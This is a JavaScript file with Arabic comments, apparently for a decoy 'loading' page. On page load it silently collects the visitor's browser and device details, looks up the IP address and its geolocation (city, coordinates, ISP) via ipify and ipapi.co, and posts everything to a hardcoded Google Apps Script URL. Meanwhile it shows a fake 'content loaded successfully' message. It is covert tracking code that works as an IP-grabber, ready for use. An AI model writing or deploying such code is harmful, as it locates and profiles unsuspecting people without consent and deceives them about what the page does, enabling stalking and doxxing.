document.addEventListener('DOMContentLoaded', function() {
    // إظهار أيقونة التحميل
    document.getElementById('loader').style.display = 'block';
    
    // جمع معلومات المتصفح والجهاز
    const userAgent = navigator.userAgent;
    const browserInfo = {
        userAgent: userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer,
        visitTime: new Date().toISOString()
    };
    
    // الحصول على IP وبيانات الموقع الجغرافي
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;
            browserInfo.ip = ip;
            
            // الحصول على معلومات الموقع الجغرافي باستخدام IP
            return fetch(`https://ipapi.co/${ip}/json/`);
        })
        .then(response => response.json())
        .then(locationData => {
            // دمج بيانات الموقع مع معلومات المتصفح
            const visitorData = {
                ...browserInfo,
                country: locationData.country_name,
                city: locationData.city,
                region: locationData.region,
                latitude: locationData.latitude,
                longitude: locationData.longitude,
                isp: locationData.org
            };
            
            // إرسال البيانات إلى Google Apps Script
            sendDataToGoogleAppsScript(visitorData);
        })
        .catch(error => {
            console.error('حدث خطأ:', error);
            // إذا فشل، أرسل المعلومات المتاحة على الأقل
            sendDataToGoogleAppsScript(browserInfo);
        });
});

// دالة لإرسال البيانات إلى Google Apps Script
function sendDataToGoogleAppsScript(data) {
    // هنا تضع رابط نشر Google Apps Script الخاص بك
    const appsScriptUrl = 'https://script.google.com/macros/s/AKfycbyUaThOm163cXvftrUUIbxtv6AsYRLUgq5MVbDTuZw4W8fEnrRTsXKX4vnXloYtgkr_YQ/exec';
    
    fetch(appsScriptUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'text/plain',
        },
        body: JSON.stringify(data),
        mode: 'no-cors' // مهم للتعامل مع CORS
    })
    .then(() => {
        // تغيير الرسالة بعد الإرسال الناجح
        document.getElementById('loader').style.display = 'none';
        document.getElementById('message').textContent = 'تم تحميل المحتوى بنجاح!';
        
        // إعادة توجيه المستخدم إلى صفحة أخرى بعد ثوانٍ (اختياري)
        setTimeout(() => {
            // يمكنك إعادة التوجيه إلى موقعك الحقيقي أو محتوى آخر
            // window.location.href = 'https://your-actual-content.com';
            document.getElementById('content').innerHTML = `
                <div class="alert alert-success">
                    <h3>تم التحميل بنجاح!</h3>
                    <p>يمكنك الآن الاستمتاع بالمحتوى.</p>
                </div>
                <!-- ضع هنا المحتوى الحقيقي الذي تريد عرضه للمستخدم -->
            `;
        }, 1500);
    })
    .catch(error => {
        console.error('فشل في إرسال البيانات:', error);
        document.getElementById('loader').style.display = 'none';
        document.getElementById('message').textContent = 'حدث خطأ أثناء تحميل المحتوى. يرجى المحاولة مرة أخرى.';
    });
}
